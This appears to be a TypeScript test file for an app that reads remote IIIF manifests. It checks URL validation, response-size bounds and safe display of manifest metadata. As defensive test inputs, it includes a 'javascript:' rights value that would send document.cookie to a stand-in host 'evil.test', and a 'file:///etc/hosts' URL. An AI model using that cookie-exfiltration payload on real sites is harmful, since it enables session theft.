import { describe, expect, it } from 'vitest';

import { describeRemoteResource } from './describe-resource';
import { ParserBoundaryError, imageServiceUriCrossingBoundary } from './parser-boundary';
import {
	REMOTE_IIIF_LIMITS,
	RemoteIiifRejectedError,
	readRemoteIiifResource,
	remoteIiifUrl
} from './remote-resource';

const json = (body: unknown, init?: ResponseInit) =>
	new Response(JSON.stringify(body), {
		headers: { 'content-type': 'application/json' },
		...init
	});

const manifest = (canvases: number, extra: Record<string, unknown> = {}) => ({
	'@context': 'http://iiif.io/api/presentation/3/context.json',
	id: 'https://library.example.test/iiif/atlas/manifest.json',
	type: 'Manifest',
	label: { en: ['A Sea Atlas'] },
	summary: { en: ['Charts of the western approaches.'] },
	metadata: [
		{ label: { en: ['Date'] }, value: { en: ['1657'] } },
		{ label: { en: ['Shelfmark'] }, value: { none: ['MS 44'] } }
	],
	requiredStatement: {
		label: { en: ['Attribution'] },
		value: { en: ['Provided by the Example Library. CC BY 4.0.'] }
	},
	rights: 'http://creativecommons.org/licenses/by/4.0/',
	...extra,
	items: Array.from({ length: canvases }, (_, index) => ({
		id: `https://library.example.test/iiif/atlas/canvas/${index + 1}`,
		type: 'Canvas',
		label: { none: [`Sheet ${index + 1}`] },
		width: 1200,
		height: 851,
		items: [
			{
				id: `https://library.example.test/iiif/atlas/page/${index + 1}`,
				type: 'AnnotationPage',
				items: [
					{
						id: `https://library.example.test/iiif/atlas/annotation/${index + 1}`,
						type: 'Annotation',
						motivation: 'painting',
						target: `https://library.example.test/iiif/atlas/canvas/${index + 1}`,
						body: {
							id: `https://images.example.test/iiif/3/sheet-${index + 1}/full/max/0/default.jpg`,
							type: 'Image',
							format: 'image/jpeg',
							width: 1200,
							height: 851,
							service: [
								{
									id: `https://images.example.test/iiif/3/sheet-${index + 1}`,
									type: 'ImageService3',
									profile: 'level2'
								}
							]
						}
					}
				]
			}
		]
	}))
});

describe('the URL a user pasted', () => {
	it.each([
		['', /Paste the address/],
		['not a url', /is not a web address/],
		['/iiif/image/info.json', /is not a web address/],
		['data:application/json,{}', /Only https:\/\/ and http:\/\//],
		['file:///etc/hosts', /Only https:\/\/ and http:\/\//],
		['javascript:alert(1)', /Only https:\/\/ and http:\/\//]
	])('refuses %s', (input, expected) => {
		expect(() => remoteIiifUrl(input)).toThrow(expected);
	});

	it('refuses a URL carrying credentials rather than storing somebody’s password', () => {
		// This URL would be written into `remote.json`, into the Alignment, and into any zip the user
		// handed a colleague. Stripping it silently would leave a reference that 404s with no
		// explanation, so it is refused with the clean address offered back.
		expect(() => remoteIiifUrl('https://reader:s3cret@library.example.test/iiif/x')).toThrow(
			/carries a username or password/
		);
		expect(() => remoteIiifUrl('https://reader:s3cret@library.example.test/iiif/x')).toThrow(
			/https:\/\/library\.example\.test\/iiif\/x/
		);
	});

	it('strips a fragment, because a viewer deep link is what people copy', () => {
		// Stripped here rather than downstream: `generateId` hashes the string it is given, so a
		// fragment left on would mint a second identity for one image and miss its community
		// alignments.
		expect(remoteIiifUrl('https://library.example.test/iiif/x#?xywh=0,0,10,10').href).toBe(
			'https://library.example.test/iiif/x'
		);
	});
});

describe('a document from somebody else’s server', () => {
	it('accepts a Manifest, a Collection, and a bare image service through one call', async () => {
		const documents: Record<string, unknown> = {
			'https://library.example.test/iiif/atlas/manifest.json': manifest(3),
			'https://library.example.test/iiif/collection': {
				'@context': 'http://iiif.io/api/presentation/3/context.json',
				id: 'https://library.example.test/iiif/collection',
				type: 'Collection',
				label: { en: ['Maps of the Low Countries'] },
				items: [
					{
						id: 'https://library.example.test/iiif/atlas/manifest.json',
						type: 'Manifest',
						label: { en: ['A Sea Atlas'] }
					}
				]
			},
			'https://images.example.test/iiif/3/sheet-1/info.json': {
				'@context': 'http://iiif.io/api/image/3/context.json',
				id: 'https://images.example.test/iiif/3/sheet-1',
				type: 'ImageService3',
				protocol: 'http://iiif.io/api/image',
				profile: 'level2',
				width: 1200,
				height: 851,
				tiles: [{ width: 256, height: 256, scaleFactors: [1, 2, 4, 8] }]
			}
		};
		const fetch = async (input: Request | string | URL) =>
			json(documents[String(input)] ?? { error: 'no' });

		expect(
			(
				await readRemoteIiifResource('https://library.example.test/iiif/atlas/manifest.json', {
					fetch
				})
			).kind
		).toBe('manifest');
		expect(
			(await readRemoteIiifResource('https://library.example.test/iiif/collection', { fetch })).kind
		).toBe('collection');
		expect(
			(
				await readRemoteIiifResource('https://images.example.test/iiif/3/sheet-1/info.json', {
					fetch
				})
			).kind
		).toBe('image');
	});

	it('names an HTML response for what it is, rather than reporting a JSON syntax error', async () => {
		// The single most common failure on this path: a 404 page, an institutional login wall, or a
		// viewer URL pasted instead of a manifest URL. "Unexpected token '<'" describes none of them.
		const failure = await readRemoteIiifResource('https://library.example.test/maps/1657', {
			fetch: async () =>
				new Response('<!DOCTYPE html><title>Not found</title>', {
					headers: { 'content-type': 'text/html; charset=utf-8' }
				})
		}).then(
			() => null,
			(cause: unknown) => cause as RemoteIiifRejectedError
		);

		expect(failure?.host).toBe('library.example.test');
		expect(failure?.message).toContain('sent a web page rather than a IIIF description');
		expect(failure?.message).not.toContain('JSON');
	});

	it('stops reading a response that is larger than the bound, without believing content-length', async () => {
		// The lesson from ticket 13's truncated archive: a declared size is a claim. Here the header
		// lies about being small and the body streams for ever, and the bound is enforced against the
		// bytes that actually arrive.
		let chunksSent = 0;
		const failure = await readRemoteIiifResource('https://library.example.test/iiif/endless', {
			limits: { documentBytes: 4096 },
			fetch: async () =>
				new Response(
					new ReadableStream<Uint8Array>({
						pull(controller) {
							chunksSent += 1;
							controller.enqueue(new Uint8Array(1024).fill(0x20));
						}
					}),
					{ headers: { 'content-type': 'application/json', 'content-length': '12' } }
				)
		}).then(
			() => null,
			(cause: unknown) => cause as RemoteIiifRejectedError
		);

		expect(failure?.message).toContain('past what Ballastella will read');
		// Abandoned in single-figure chunks rather than after reading an unbounded body.
		expect(chunksSent).toBeLessThan(10);
	});

	it('refuses a Manifest with more canvases than it will browse', async () => {
		const failure = await readRemoteIiifResource(
			'https://library.example.test/iiif/atlas/manifest.json',
			{
				limits: { canvases: 4 },
				fetch: async () => json(manifest(9))
			}
		).then(
			() => null,
			(cause: unknown) => cause as RemoteIiifRejectedError
		);

		expect(failure?.message).toContain('lists 9 canvases');
		expect(failure?.message).toContain('Nothing has been added');
	});

	it('reports a non-IIIF JSON document as such', async () => {
		const failure = await readRemoteIiifResource('https://library.example.test/api/record/44', {
			fetch: async () => json({ title: 'A Sea Atlas', pages: 12 })
		}).then(
			() => null,
			(cause: unknown) => cause as RemoteIiifRejectedError
		);

		expect(failure?.message).toContain('is not a IIIF Manifest, Collection, or image description');
	});

	it('reports the status a server answered with', async () => {
		const failure = await readRemoteIiifResource('https://library.example.test/iiif/gone', {
			fetch: async () => json({}, { status: 503, statusText: 'Service Unavailable' })
		}).then(
			() => null,
			(cause: unknown) => cause as RemoteIiifRejectedError
		);

		expect(failure?.message).toContain('answered 503 Service Unavailable');
	});

	it('has a default byte bound, so the tests above are not the only thing enforcing one', () => {
		// A bound that only exists when a test passes `limits` is not a bound.
		expect(REMOTE_IIIF_LIMITS.documentBytes).toBeGreaterThan(0);
		expect(REMOTE_IIIF_LIMITS.timeoutMs).toBeGreaterThan(0);
	});
});

describe('what a selection pane is shown', () => {
	it('reads a Manifest’s label, summary, metadata, rights, and attribution', async () => {
		const resource = await readRemoteIiifResource(
			'https://library.example.test/iiif/atlas/manifest.json',
			{ fetch: async () => json(manifest(2)) }
		);
		const described = describeRemoteResource(resource.parsed, resource.document);

		expect(described.label).toBe('A Sea Atlas');
		expect(described.summary).toBe('Charts of the western approaches.');
		expect(described.metadata).toEqual([
			{ label: 'Date', value: '1657' },
			{ label: 'Shelfmark', value: 'MS 44' }
		]);
		expect(described.rights).toBe('http://creativecommons.org/licenses/by/4.0/');
		expect(described.attribution).toEqual({
			label: 'Attribution',
			value: 'Provided by the Example Library. CC BY 4.0.'
		});
	});

	it('reads Presentation 2’s `license` as rights, because a library that has not migrated still said so', async () => {
		const resource = await readRemoteIiifResource(
			'https://library.example.test/iiif/atlas/manifest.json',
			{
				fetch: async () =>
					json({
						...manifest(1, { license: 'https://rightsstatements.org/vocab/InC/1.0/' }),
						rights: undefined
					})
			}
		);

		expect(describeRemoteResource(resource.parsed, resource.document).rights).toBe(
			'https://rightsstatements.org/vocab/InC/1.0/'
		);
	});

	it('refuses to make a javascript: rights statement clickable', async () => {
		// Svelte does not sanitise `href`. A Manifest declaring `"rights": "javascript:…"` would
		// otherwise produce a link that runs script the moment a scholar clicks it to read the licence —
		// which is the most natural thing in the world to click. So `rightsLink` is a separate field
		// from `rights`: the string is still shown, and it is not a link.
		const resource = await readRemoteIiifResource(
			'https://library.example.test/iiif/atlas/manifest.json',
			{
				fetch: async () =>
					json({ ...manifest(1), rights: 'javascript:fetch("https://evil.test/"+document.cookie)' })
			}
		);
		const described = describeRemoteResource(resource.parsed, resource.document);

		expect(described.rights).toBe('javascript:fetch("https://evil.test/"+document.cookie)');
		expect(described.rightsLink).toBe('');
	});

	it('keeps a real rights statement clickable', async () => {
		const resource = await readRemoteIiifResource(
			'https://library.example.test/iiif/atlas/manifest.json',
			{ fetch: async () => json(manifest(1)) }
		);
		const described = describeRemoteResource(resource.parsed, resource.document);

		expect(described.rightsLink).toBe('http://creativecommons.org/licenses/by/4.0/');
	});

	it('lists each canvas with the image service URI that will cross the boundary', async () => {
		const resource = await readRemoteIiifResource(
			'https://library.example.test/iiif/atlas/manifest.json',
			{ fetch: async () => json(manifest(3)) }
		);
		const described = describeRemoteResource(resource.parsed, resource.document);

		expect(described.canvases).toHaveLength(3);
		expect(described.canvases[1]).toEqual({
			uri: 'https://library.example.test/iiif/atlas/canvas/2',
			label: 'Sheet 2',
			imageService: 'https://images.example.test/iiif/3/sheet-2',
			width: 1200,
			height: 851
		});
	});

	it('numbers an unlabelled canvas rather than showing a blank row', async () => {
		const document = manifest(2) as { items: { label?: unknown }[] };
		delete document.items[0]!.label;
		const resource = await readRemoteIiifResource(
			'https://library.example.test/iiif/atlas/manifest.json',
			{ fetch: async () => json(document) }
		);

		expect(describeRemoteResource(resource.parsed, resource.document).canvases[0]?.label).toBe(
			'Image 1'
		);
	});
});

describe('the parser boundary', () => {
	it('lets an image service URI across', () => {
		expect(
			imageServiceUriCrossingBoundary('https://images.example.test/iiif/3/sheet-1/info.json')
		).toBe('https://images.example.test/iiif/3/sheet-1');
	});

	it('refuses a parsed object, which is the mistake that would otherwise compile', async () => {
		// ADR-0018's rule is that only a string crosses. A parsed canvas has an `imageService`
		// property on *both* parsers' objects, so handing one over type-checks and works — until the
		// manifest where manifesto.js and @allmaps/iiif-parser read the same document differently, at
		// which point nothing is wrong anywhere and the map is in the wrong place.
		const resource = await readRemoteIiifResource(
			'https://library.example.test/iiif/atlas/manifest.json',
			{ fetch: async () => json(manifest(1)) }
		);
		const canvas = resource.parsed.type === 'manifest' ? resource.parsed.canvases[0] : null;

		expect(() => imageServiceUriCrossingBoundary(canvas)).toThrow(ParserBoundaryError);
		expect(() => imageServiceUriCrossingBoundary(canvas)).toThrow(/parsed Canvas object/);
		expect(() => imageServiceUriCrossingBoundary(canvas)).toThrow(/ADR-0018/);
	});

	it.each([
		['an EmbeddedImage-shaped wrapper', { uri: 'https://images.example.test/iiif/3/sheet-1' }],
		['an array of URIs', ['https://images.example.test/iiif/3/sheet-1']],
		['null', null],
		['undefined', undefined],
		['a number', 42]
	])('refuses %s', (_what, value) => {
		expect(() => imageServiceUriCrossingBoundary(value)).toThrow(ParserBoundaryError);
	});

	it('explains a canvas that paints nothing alignable, rather than reporting a bug', () => {
		// A canvas of video, of a plain JPEG, or of an unresolved Choice reports `''` from
		// `imageServiceOf`. That is the user meeting ADR-0014's scope fence, not a programming error,
		// so it is a different message and a different error class.
		expect(() => imageServiceUriCrossingBoundary('')).toThrow(RemoteIiifRejectedError);
		expect(() => imageServiceUriCrossingBoundary('   ')).toThrow(
			/does not paint a IIIF image service/
		);
	});

	it('applies the same URL rules as a pasted address', () => {
		expect(() => imageServiceUriCrossingBoundary('data:image/png;base64,AAAA')).toThrow(
			/Only https:\/\/ and http:\/\//
		);
	});
});
